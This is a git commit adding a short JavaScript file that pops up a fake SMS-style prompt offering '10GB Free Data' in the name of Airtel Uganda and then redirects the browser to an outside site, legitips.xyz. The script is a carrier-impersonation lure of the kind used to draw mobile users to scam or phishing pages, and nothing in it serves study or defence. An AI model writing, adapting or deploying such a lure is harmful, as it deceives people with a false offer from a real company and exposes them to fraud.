09fdf69b321aedae6572bb84de7eac39cb92ea71
legitips <83867893+legitips@users.noreply.github.com>
2024-08-19 15:40:38 -0700

    Create activation-freedata-airteluganda.js

---
+++ activation-freedata-airteluganda.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS: Congratulations you are among the active customer to receive 10GB Free Data, Kindly press 1 to ACTIVATE ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/freedata-airteluganda.html';
+}
